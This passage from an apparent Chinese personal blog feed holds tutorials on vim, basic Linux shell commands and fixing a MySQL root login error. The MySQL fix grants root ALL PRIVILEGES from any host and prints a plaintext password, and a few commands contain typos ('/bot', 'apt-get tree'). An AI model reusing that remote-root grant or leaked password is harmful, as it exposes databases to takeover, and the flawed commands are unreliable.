data-language="bash"><code class="language-bash">$ <span class="token function">vim</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如在启动vim时未指定文件名，或者这个文件不存在， vim会<strong>开辟一段新的缓冲区域</strong>来编辑。如果你在命令行下指定了一个已有文件的名字， vim会将文件的整个内容都<strong>读到一块缓冲区域</strong>来准备编辑 。</p><p>vim编辑器会检测会话终端的类型，并用<strong>全屏模式</strong>将整个控制台窗口作为编辑器区域。<br>最初的vim编辑窗口显示了文件的内容（如果有内容的话），并在窗口的底部显示了一条消息行。如果文件内容并未占据整个屏幕， vim会在<strong>非文件内容行放置一个波浪线</strong> 。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux3/202201171711057.png"></p><p>vim编辑器有<strong>两种操作模式</strong>：</p><ul><li><font color="#FF5E3A" size="3">普通模式</font></li><li><font color="#FF5E3A" size="3">插入模式</font></li></ul><p>刚打开要编辑的文件时（或新建一个文件时）， vim编辑器会进入普通模式。<font color="#FF5E3A" size="3">在普通模式中， vim编辑器会将按键解释成命令。</font>  </p><p>在插入模式下， vim会将你在当前光标位置输入的每个键都插入到缓冲区。<font color="#FF5E3A" size="3">按下i键就可以进入插入模式</font>。要退出插入模式回到普通模式，按下键盘上的<strong>退出键（ ESC键）</strong>就可以了。  </p><p>在普通模式中，可以用方向键在文本区域<strong>移动光标</strong> 或者使用如下键：</p><ul><li>h：左移一个字符。  </li><li>j：下移一行（文本中的下一行）。  </li><li>k：上移一行（文本中的上一行）。  </li><li>l：右移一个字符。  </li></ul><p>在大的文本文件中一行一行地来回移动会特别麻烦，幸而vim提供了一些能够提高移动速度<br>的命令。</p><ul><li><code>PageDown</code>（或Ctrl+F）：下翻一屏。</li><li><code>PageUp</code>（或Ctrl+B）：上翻一屏。</li><li>G：移到缓冲区的最后一行。</li><li><code>num G</code>：移动到缓冲区中的第<code>num</code>行。</li><li>gg：移到缓冲区的第一行。  </li></ul><p>vim编辑器在普通模式下有个特别的功能叫<font color="#FF5E3A" size="3">命令行模式</font>。命令行模式提供了一个交互式命令行，<strong>可以输入额外的命令来控制vim的行为</strong>。要进入命令行模式，在普通模式下<font color="#FF5E3A" size="3">按下冒号键</font>。光标会移动到消息行，然后出现冒号，等待输入命令。  </p><p>在命令行模式下有几个命令可以<strong>将缓冲区的数据保存到文件中并退出vim</strong>。</p><ul><li>q：如果未修改缓冲区数据，退出</li><li>q!：<strong>取消</strong>所有对缓冲区数据的修改并退出。</li><li>w filename：将文件保存到另一个文件中。</li><li>wq：将缓冲区数据<strong>保存</strong>到文件中并退出。 </li></ul><h3 id="3-3-编辑数据"><a href="#3-3-编辑数据" class="headerlink" title="3.3 编辑数据"></a>3.3 编辑数据</h3><p>在插入模式下，你可以向缓冲区插入数据。然而有时将数据输入到缓冲区中后，你需要再对其进行添加或删除。在<strong>普通模式下</strong>， vim编辑器提供了一些命令来<strong>编辑缓冲区中的数据</strong>。下表列出了一些常用的vim编辑命令。  </p><hr><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>dd</td><td>删除当前光标所在行</td></tr><tr><td>x</td><td>删除当前光标所在位置的字符</td></tr><tr><td>dw</td><td>删除当前光标所在位置的单词</td></tr><tr><td>d$</td><td>删除当前光标所在位置至行尾的内容</td></tr><tr><td>u</td><td>撤销前一编辑命令</td></tr><tr><td>J</td><td>删除当前光标所在行行尾的换行符（拼接行）</td></tr><tr><td>A</td><td>在当前光标所在行行尾追加数据（直接进入了插入模式）</td></tr><tr><td>a</td><td>在当前光标后追加数据（直接进入了插入模式）</td></tr><tr><td>r char</td><td>用char替换当前光标所在位置的单个字符</td></tr></tbody></table><hr><p>说明 在vim编辑器的普通模式下使用退格键（ Backspace键）和删除键（ Delete键）时要留心。vim编辑器通常会<strong>将删除键识别成x命令</strong>的功能，删除当前光标所在位置的字符。 vim编辑器在普通模式下通常不识别退格键。  </p><hr><h3 id="3-4-复制和粘贴"><a href="#3-4-复制和粘贴" class="headerlink" title="3.4 复制和粘贴"></a>3.4 复制和粘贴</h3><h4 id="3-4-1-粘贴内容"><a href="#3-4-1-粘贴内容" class="headerlink" title="3.4.1 粘贴内容"></a>3.4.1 粘贴内容</h4><p><font color="#FF5E3A" size="3">vim在删除数据时，实际上会将数据保存在单独的一个寄存器中。可以用p命令取回数据。 </font> </p><p>举例来说，可以用<code>dd</code>命令删除一行文本，然后把光标移动到缓冲区的某个要放置该行文本的位置，然后用<code>p</code>命令。该命令会将文本插入到当前光标所在行之后。可以将它和任何删除文本的命令一起搭配使用。  (注意p命令粘贴的只是上<strong>一次</strong>删除的内容。)</p><h4 id="3-4-2-复制内容"><a href="#3-4-2-复制内容" class="headerlink" title="3.4.2 复制内容"></a>3.4.2 复制内容</h4><p>vim中复制命令是y（代表yank）。可以在y后面使用和d命令相同的第二字符（ yw表示复制一个单词， y$表示复制到行尾）。在复制文本后，把光标移动到你想放置文本的地方，输入p命令。复制的文本就会出现在该位置  。</p><h4 id="3-4-3-复制内容-可视化模式"><a href="#3-4-3-复制内容-可视化模式" class="headerlink" title="3.4.3 复制内容-可视化模式"></a>3.4.3 复制内容-可视化模式</h4><p>按下<code>v</code>键进入可视化模式。下一步，移动光标来覆盖你想要复制的文本（甚至可以向下移动几行来复制更多行的文本）。在移动光标时， vim会高亮显示复制区域的文本。在覆盖了要复制的文本后，按y键来激活复制命令。移动光标到要放置的位置，使用p命令来粘贴。  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux3/202201171711059.png"></p><h3 id="3-5-查找和替换"><a href="#3-5-查找和替换" class="headerlink" title="3.5 查找和替换"></a>3.5 查找和替换</h3><h4 id="3-5-1-查找"><a href="#3-5-1-查找" class="headerlink" title="3.5.1 查找"></a>3.5.1 查找</h4><p>按下斜线 <code>/键</code>，光标会跑到消息行，然后vim会显示出斜线。在输入你要查找的文本后，按下回车键。会出现三种可能的结果：</p><ul><li>要查找的文本出现在光标当前位置之后，则光标会跳到该文本出现的第一个位置。  </li><li>要查找的文本未在光标当前位置之后出现，则光标会绕过文件末尾，出现在该文本所在的第一个位置（并用一条消息指明）。</li><li>输出一条错误消息，说明在文件中没有找到要查找的文本。  </li></ul><p>要继续查找同一个单词，按下斜线键，然后按回车键。或者使用<code>n键</code>，表示下一个（ next）。    </p><h4 id="3-5-2-替换"><a href="#3-5-2-替换" class="headerlink" title="3.5.2 替换"></a>3.5.2 替换</h4><p><font color="#FF5E3A" size="3">必须进入命令行模式才能使用替换命令。</font>替换命令的格式是：<code>:s/old/new/</code> ，vim编辑器会跳到old第一次出现的地方，并用new来替换。  </p><p>可以对替换命令作一些修改来替换多处文本：  </p><ul><li><code>:s/old/new/g</code>：替换光标所在行的所有old。  </li><li><code>:n,ms/old/new/g</code>：替换行号n和m之间所有old。  </li><li><code>:%s/old/new/g</code>：替换整个文件中的所有old。  </li><li><code>:%s/old/new/gc</code>：替换整个文件中的所有old，但在每次出现时提示。  </li></ul><hr><p>这里就是基本的vim编辑器命令，需要经常使用增加手指记忆，还有许多其他的编辑器，先学会这个再学学别的~</p><p><font color="#FF9999" size="3">文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux3/202201171711060.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux登录mysql报错</title>
      <link href="/posts/myh10006.html"/>
      <url>/posts/myh10006.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="mysql登录报错：ERROR-1045-28000"><a href="#mysql登录报错：ERROR-1045-28000" class="headerlink" title="mysql登录报错：ERROR 1045 (28000)"></a>mysql登录报错：ERROR 1045 (28000)</h2><p>在使用xshell连接服务器登陆mysql的时候，出现Access denied for user ‘root’@’localhost’ (using password: YES) 拒绝访问。emmm这就很尴尬，接着我登上服务器的终端也不行，查了一下解决方法如下：</p><h4 id="1、vim-etc-my-cnf文件"><a href="#1、vim-etc-my-cnf文件" class="headerlink" title="1、vim /etc/my.cnf文件"></a>1、vim /etc/my.cnf文件</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/my.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 [mysqld] 后添加  skip-grant-tables （跳过检查），然后按esc、ZZ退出。</p><h4 id="2、重启MySQL服务："><a href="#2、重启MySQL服务：" class="headerlink" title="2、重启MySQL服务："></a>2、重启MySQL服务：</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3、修改密码"><a href="#3、修改密码" class="headerlink" title="3、修改密码"></a>3、修改密码</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">set password for 'root'@'localhost'=password('你的密码');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可能会出现  ERROR 1290 (HY000): The MySQL server is running with the –skip-grant-tables option so it cannot execute this statement  的报错，输入 ：flush privileges;</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">flush privileges;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4、再次重新设置密码"><a href="#4、再次重新设置密码" class="headerlink" title="4、再次重新设置密码"></a>4、再次重新设置密码</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">set password for 'root'@'localhost'=password('你的密码');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5、重设远程访问"><a href="#5、重设远程访问" class="headerlink" title="5、重设远程访问"></a>5、重设远程访问</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'Mingloveyh1314' WITH GRANT OPTION;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6、把skip-grant-tables删除"><a href="#6、把skip-grant-tables删除" class="headerlink" title="6、把skip-grant-tables删除"></a>6、把skip-grant-tables删除</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/my.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7、重启MySQL"><a href="#7、重启MySQL" class="headerlink" title="7、重启MySQL"></a>7、重启MySQL</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后就可以正常登陆了~</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202201161214197.png" style="zoom:150%;"><hr><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202201161214199.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第二章</title>
      <link href="/posts/myh10005.html"/>
      <url>/posts/myh10005.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第二章：基本的-bash-shell-命令"><a href="#第二章：基本的-bash-shell-命令" class="headerlink" title="第二章：基本的 bash shell 命令"></a>第二章：基本的 bash shell 命令</h2><h3 id="2-1浏览文件系统"><a href="#2-1浏览文件系统" class="headerlink" title="2.1浏览文件系统"></a>2.1浏览文件系统</h3><h4 id="2-1-1-Linux文件系统"><a href="#2-1-1-Linux文件系统" class="headerlink" title="2.1.1 Linux文件系统"></a>2.1.1 Linux文件系统</h4><p>Linux不同于WIndows，在路径名中不使用驱动器盘符。  </p><p>Linux将文件存储在<font color="#FF5E2A" size="4"><strong>单个目录结构</strong></font>中，这个目录被称为<font color="#FF5E2A" size="4"><strong>虚拟目录（ virtual directory）</strong></font>。虚拟目录将安装在PC上的所有存储设备的文件路径纳入单个目录结构中。Linux虚拟目录结构<strong>只包含一个称为<font color="#FF5E2A" size="4">根（ root）目录</font>的基础目录</strong>。根目录下的目录和文件会按照访问它们的目录路径一一列出，这点跟Windows类似。  </p><p>在Linux PC上安装的<strong>第一块硬盘</strong>称为根驱动器。<strong>根驱动器包含了虚拟目录的核心</strong>，其他目录都是从那里开始构建的。Linux会在根驱动器上创建一些特别的目录，我们称之为<strong>挂载点（ mount point）</strong>。<font color="#FF5E2A" size="4">挂载点是虚拟目录中用于分配额外存储设备的目录</font>。虚拟目录会让文件和目录出现在这些挂载点目录中，然而<strong>实际上它们却存储在另外一个驱动器</strong>中。 </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635094.png"></p><p>如图Disk1硬盘和虚拟目录的根目录关联起来。Disk2硬盘就可以挂载到虚拟目录结构中的任何地方。在这个例子中，第二块硬盘被挂载到了/home位置，home这个目录就是一个挂载点，用户目录都位于这个位置。</p><p>​                                                                                        <strong>常见的Linux目录名称</strong></p><table><thead><tr><th align="center"><strong>/</strong></th><th align="center">虚拟目录的根目录。通常不会在这里存储文件</th></tr></thead><tbody><tr><td align="center">/bin</td><td align="center">二进制目录，存放许多用户级的GNU工具</td></tr><tr><td align="center">/bot</td><td align="center">启动目录，存放启动文件</td></tr><tr><td align="center">/dev</td><td align="center">设备目录， Linux在这里创建设备节点</td></tr><tr><td align="center"><strong>/etc</strong></td><td align="center"><strong>系统配置文件目录</strong></td></tr><tr><td align="center"><strong>/home</strong></td><td align="center">主目录， Linux在这里创建<strong>用户目录</strong></td></tr><tr><td align="center">/lib</td><td align="center">库目录，存放系统和应用程序的库文件</td></tr><tr><td align="center">/media</td><td align="center">媒体目录，可移动媒体设备的常用<strong>挂载点</strong></td></tr><tr><td align="center">/mnt</td><td align="center">挂载目录，另一个可移动媒体设备的常用挂载点</td></tr><tr><td align="center">/opt</td><td align="center">可选目录，常用于存放<strong>第三方软件包和数据文件</strong></td></tr><tr><td align="center"><strong>/proc</strong></td><td align="center">进程目录，存放现有硬件及当前<strong>进程的相关信息</strong></td></tr><tr><td align="center"><strong>/root</strong></td><td align="center"><strong>root用户的主目录</strong></td></tr><tr><td align="center">/sbin</td><td align="center">系统二进制目录，存放许多GNU管理员级工具</td></tr><tr><td align="center">/run</td><td align="center">运行目录，存放系统运作时的运行时数据</td></tr><tr><td align="center">/srv</td><td align="center">服务目录，存放本地服务的相关文件</td></tr><tr><td align="center">/sys</td><td align="center">系统目录，存放系统硬件信息的相关文件</td></tr><tr><td align="center"><strong>/tmp</strong></td><td align="center">临时目录，<strong>可以在该目录中创建和删除临时工作文件</strong></td></tr><tr><td align="center">/usr</td><td align="center">用户二进制目录，大量用户级的GNU工具和数据文件都存储在这里</td></tr><tr><td align="center"><strong>/var</strong></td><td align="center">可变目录，用以存放经常变化的文件，比如<strong>日志文件</strong></td></tr></tbody></table><h4 id="2-1-2-遍历目录"><a href="#2-1-2-遍历目录" class="headerlink" title="2.1.2 遍历目录"></a>2.1.2 遍历目录</h4><p>在Linux文件系统上，可以使用<font color="#FF5E2A" size="2">切换目录命令cd将shell会话切换到另一个目录</font>。 cd命令的格式非常简单：<strong>cd destination</strong><br>cd命令可接受单个参数destination，用以指定想切换到的目录名。<strong>如果没有为cd命令指定目标路径，它将切换到用户主目录。</strong><br>destination参数可以用两种方式表示：一种是使用<strong>绝对文件路径</strong>，另一种是使用<strong>相对文件路径</strong>。</p><p><strong>1.绝对文件路径</strong></p><p>​            <font color="#FF5E2A" size="2">对文件路径总是以正斜线（ /）作为起始，指明虚拟文件系统的根目录。</font>  </p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928215.png" style="zoom:200%;"><p>如图刚开始是在/root目录中，如果切换到usr/bin目录中，就直接使用 cd /usr/bin，（一定最开始是根目录！）</p><p>这里的 <strong>pwd 是显示当前所在的位置</strong>的命令。</p><p><strong>2.相对文件路径</strong></p><p>就是基于你目前所在的目录进行相对的移动。</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928216.png" style="zoom:150%;"><p>如图，刚开始在usr目录中，要进入usr的lib目录中，则可以直接 cd lib 。（ls 是显示当前目录下的文件和子目录，后面会讲。）</p><p>有两个特殊字符可用于相对文件路径中：</p><ul><li> <strong>单点符（ .）</strong>，表示当前目录；</li><li> <strong>双点符（ ..）</strong>，表示当前目录的父目录。</li></ul><p>重点就是双点符，可以较为方便的在相对文件路径中使用：</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928217.png" style="zoom:150%;"><h3 id="2-2-文件和目录列表"><a href="#2-2-文件和目录列表" class="headerlink" title="2.2 文件和目录列表"></a>2.2 文件和目录列表</h3><h4 id="2-2-1-基本列表功能"><a href="#2-2-1-基本列表功能" class="headerlink" title="2.2.1 基本列表功能"></a>2.2.1 基本列表功能</h4><p><strong><code>ls [path]</code> - 列出文件</strong></p><p>该程序<code>ls</code>允许您列出<strong>目录中的文件和其子目录</strong>。它可以传递许多不同的参数（或“标志”）来控制输出。</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635096.png"></p><p><strong><code>ls -F</code></strong>  带-F参数的ls命令<strong>轻松区分文件和目录</strong>  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635097.png"></p><p>Linux经常<strong>采用隐藏文件来保存配置信息</strong>。在Linux上，隐藏文件通常是<strong>文件名以点号开始</strong>的文件。这些文件并<strong>没有</strong>在默认的ls命令输出中显示出来，因此我们称其为<font color="#FF5E3A" size="3">隐藏文件</font>。  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635098.png"></p><p>ls支持选项合并如：<code>ls -Fa</code></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635100.png"></p><p><strong><code>ls -l</code> 显示附加信息，长列表输出</strong></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635101.png" style="zoom:150%;"><ul><li><p> 文件类型，比如目录（ d）、文件（ -）、字符型文件（ c）或块设备（ b）；</p></li><li><p> 文件的权限；</p></li><li><p>文件的硬链接总数；</p></li><li><p> 文件属主的用户名；</p></li><li><p> 文件属组的组名；</p></li><li><p> 文件的大小（以<strong>字节</strong>为单位）；</p></li><li><p> 文件的上次<strong>修改时间</strong>；</p></li><li><p> 文件名或目录名。  </p></li></ul><h4 id="2-2-2-过滤输出列表"><a href="#2-2-2-过滤输出列表" class="headerlink" title="2.2.2 过滤输出列表"></a>2.2.2 过滤输出列表</h4><p>当要输出指定文件或者指定开头等的文件时，可以使用过滤查询：<code>ls -l x</code> ，过滤器就是一个进行简单文本匹配的字符串。可以在要用的命令行参数之后添加这个过滤器  。<strong>同时支持通配符匹配</strong>。</p><ul><li><p> 问号（ ?）代表<strong>一个</strong>字符；</p></li><li><p> 星号（ *）代表<strong>零个或多个</strong>字符。  </p></li></ul><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635102.png" style="zoom:150%;"><h4 id="2-2-3-tree"><a href="#2-2-3-tree" class="headerlink" title="2.2.3 tree"></a>2.2.3 tree</h4><p>还有一个遍历文件功能指令tree,能较好地展示文件之间的层级结构，将本目录中的文件、子目录、子目录中的文件都以树形展示出来：（Debian 版本没有这个指令，可以<code>apt-get tree</code>安装），不要尝试<code>tree /</code>,除非你觉着很炫酷hhhh</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635103.png"></p><h3 id="2-3-处理文件"><a href="#2-3-处理文件" class="headerlink" title="2.3 处理文件"></a>2.3 处理文件</h3><h4 id="2-3-1-创建文件"><a href="#2-3-1-创建文件" class="headerlink" title="2.3.1 创建文件"></a>2.3.1 创建文件</h4><p><strong>touch</strong>命令轻松创建<strong>空文件</strong>（<strong>注意是空文件，不代表可以是空目录哦</strong>）。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">touch</span> test_one<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635104.png" style="zoom:150%;"><h4 id="2-3-2-复制文件"><a href="#2-3-2-复制文件" class="headerlink" title="2.3.2 复制文件"></a>2.3.2 复制文件</h4><p><strong>cp</strong>命令将文件或目录从一个位置复制到另一个位置  。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cp</span> <span class="token operator">&lt;</span>source<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>destination<span class="token operator">&gt;</span> - 复制文件-i选项，强制shell询问是否需要覆盖已有文件。-R参数，可以用它在一条命令中递归地复制整个目录的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635105.png"></p><p>可以看到加上 -i 选项，就会强制询问是否覆盖，<strong>最好每次都带上</strong>，写 yes/no 就可。可以看到修改时间没变。</p><p>cp命令的-<strong>R参数</strong>。可以用它在一条命令中<strong>递归地复制整个目录的内容</strong>。  </p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635106.png" style="zoom:150%;"><h4 id="2-3-3-移动和重命名文件"><a href="#2-3-3-移动和重命名文件" class="headerlink" title="2.3.3 移动和重命名文件"></a>2.3.3 移动和重命名文件</h4><p>在Linux中，<strong>重命名文件称为移动（ moving）</strong> 。 mv命令可以将文件和目录移动到另一个位置或重新命名。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Moving a file "into" another file is how you rename files</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># mv test_file test_file1</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ls -F</span>test2/testdir/  test_file1  test_file2<span class="token comment"># Move file into directory</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># mv test_file1 testdir/</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># tree</span><span class="token builtin class-name">.</span>├── test2│   ├── test_file│   └── test_file2├── testdir│   └── test_file1└── test_file2<span class="token number">2</span> directories, <span class="token number">4</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-3-4-删除文件"><a href="#2-3-4-删除文件" class="headerlink" title="2.3.4 删除文件"></a>2.3.4 删除文件</h4><p>在Linux中，删除（ deleting）叫作移除（ removing） 。 bash shell中删除文件的命令是 <strong>rm</strong>。  -+</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">`</span><span class="token function">rm</span> <span class="token operator">&lt;</span>filename<span class="token operator">&gt;</span><span class="token variable">`</span></span> - 永久删除文件-i命令参数提示你是不是要真的删除该文件-r参数删除目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test/test2<span class="token comment"># rm -i test_file</span>rm: remove regular empty <span class="token function">file</span> <span class="token string">'test_file'</span>? yroot@VM-16-11-debian:/tmp/test/test2<span class="token comment"># ls -l</span>total <span class="token number">0</span>-rw-r--r-- <span class="token number">1</span> root root <span class="token number">0</span> Jan <span class="token number">16</span> <span class="token number">15</span>:35 test_file2-r参数删除目录：root@VM-16-11-debian:/tmp/test<span class="token comment"># rm -r test2</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># tree</span><span class="token builtin class-name">.</span>├── testdir│   └── test_file1└── test_file2<span class="token number">1</span> directory, <span class="token number">2</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-4-处理目录"><a href="#2-4-处理目录" class="headerlink" title="2.4 处理目录"></a>2.4 处理目录</h3><h4 id="2-4-1-创建目录"><a href="#2-4-1-创建目录" class="headerlink" title="2.4.1 创建目录"></a>2.4.1 创建目录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">mkdir</span> New_Dir-p参数：同时创建多个目录和子目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># mkdir -p test2/test3</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># tree</span><span class="token builtin class-name">.</span>├── test2│   └── test3├── testdir│   └── test_file1└── test_file2<span class="token number">3</span> directories, <span class="token number">2</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-4-2-删除目录"><a href="#2-4-2-删除目录" class="headerlink" title="2.4.2 删除目录"></a>2.4.2 删除目录</h4><p>rmdir命令<strong>只删除空目录</strong>。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">rmdir</span> mydir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># rmdir test2</span>rmdir: failed to remove <span class="token string">'test2'</span><span class="token builtin class-name">:</span> Directory not empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-5-查看文件"><a href="#2-5-查看文件" class="headerlink" title="2.5 查看文件"></a>2.5 查看文件</h3><h4 id="2-5-1-查看文件类型"><a href="#2-5-1-查看文件类型" class="headerlink" title="2.5.1  查看文件类型"></a>2.5.1  查看文件类型</h4><p>在显示文件内容之前，应该先了解一下文件的类型。如果打开了一个二进制文件，你会在屏幕上看到各种乱码，甚至会把你的终端仿真器挂起。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">file</span> my_file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># file testdir</span>testdir: directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-5-2-查看整个文件"><a href="#2-5-2-查看整个文件" class="headerlink" title="2.5.2 查看整个文件"></a>2.5.2 查看整个文件</h4><p><strong><code>cat &lt;filename&gt;</code> - 打印文件</strong></p><p>要将文件的内容快速转储到控制台，请使用<code>cat</code>.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> file1-n参数会给所有的行加上行号。-b参数会给只是文本的行加上行号。The quick brown fox jumped over the lazy dog.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>more</code>命令</strong></p><p><code>cat</code>命令的主要缺陷是：一旦运行，你就无法控制后面的操作。为了解决这个问题，开发人员编写了<code>more</code>命令。 <code>more</code>命令会显示文本文件的内容，但会在显示每页数据之后停下来。 可以通过按空格键或回车键以逐行向前的方式浏览文本文件。浏览完之后，按q键退出。 </p><p><strong><code>less</code>命令</strong></p><p><strong><code>less &lt;filename&gt;</code> - 显示和滚动文件</strong></p><p><code>less</code>如果您想查看一个不完全适合一个屏幕的长文件的内容，该程序很有用。要在运行后退出，请按 <code>q</code>。</p><p>你可以用更少的时间做很多其他的事情，但一件有用的事情是能够搜索。您可以搜索<code>/banana</code>以查找文件中“香蕉”的所有实例。</p><h4 id="2-5-3-查看部分文件"><a href="#2-5-3-查看部分文件" class="headerlink" title="2.5.3 查看部分文件"></a>2.5.3 查看部分文件</h4><ol><li><p><strong><code>tail</code>命令</strong><br>tail命令会显示文件最后几行的内容（文件的“尾部”）。默认情况下，它会显示文件的末尾10行。  可以向tail命令中加入-n参数来修改所显示的行数:  <code>tail -2 text</code> 。</p></li><li><p><strong><code>head</code>命令</strong>  </p><p>head命令，顾名思义，会显示文件开头那些行的内容。默认情况下，它会显示文件前10行的文本。同理可以加入 -n 参数指定行数。 </p></li></ol><hr><p>本章的学习就到这啦，下章将继续讨论bash shell的命令，并了解更多管理Linux系统时经常用到的高级系统管理命令。  </p><p><font color="#FF9999" size="2">文章参考：Linux命令行与shell脚本编程大全.第2版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928218.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf练习[1-10]</title>
      <link href="/posts/myh10004.html"/>
      <url>/posts/myh10004.html</url>
      
